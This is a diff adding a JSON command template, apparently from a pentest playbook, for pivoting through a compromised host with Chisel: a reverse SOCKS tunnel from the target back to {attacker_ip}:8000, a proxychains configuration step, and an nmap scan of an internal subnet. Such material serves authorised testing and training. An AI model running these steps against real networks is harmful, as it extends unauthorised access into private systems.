@@ -1,0 +1,31 @@
+{
+  "title": "Internal Pivot with Chisel",
+  "description": "Setup and use Chisel for internal pivoting to access an internal subnet via SOCKS proxy.",
+  "commands": [
+    {
+      "title": "Start Chisel Server on Attacker",
+      "template": "chisel server --port 8000 --socks5 --reverse",
+      "description": "Start Chisel server in reverse mode with SOCKS5 proxy enabled on port 8000."
+    },
+    {
+      "title": "Run Chisel Client on Target",
+      "template": "./chisel client --fingerprint {fingerprint} {attacker_ip}:8000 R:socks",
+      "description": "Connect the Chisel client from the target to the attacker. Replace {fingerprint} with server fingerprint and {attacker_ip} with your attack machine IP."
+    },
+    {
+      "title": "Configure Proxychains to use SOCKS5 Proxy",
+      "template": "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf",
+      "description": "Add SOCKS5 proxy at localhost port 1080 (default chisel server SOCKS port) to proxychains configuration."
+    },
+    {
+      "title": "Use Proxychains with Nmap or Other Tools",
+      "template": "proxychains nmap -sT -p 80 10.0.52.0/24",
+      "description": "Run Nmap scan through the SOCKS5 proxy to scan internal subnet 10.0.52.0/24."
+    }
+  ],
+  "notes": [
+    "Make sure to replace {fingerprint} with the actual server fingerprint shown when you start the chisel server.",
+    "Ensure the target can reach the attacker's IP and port 8000.",
+    "Proxychains is used to route traffic through the chisel SOCKS5 proxy to reach internal network resources."
+  ]
+}
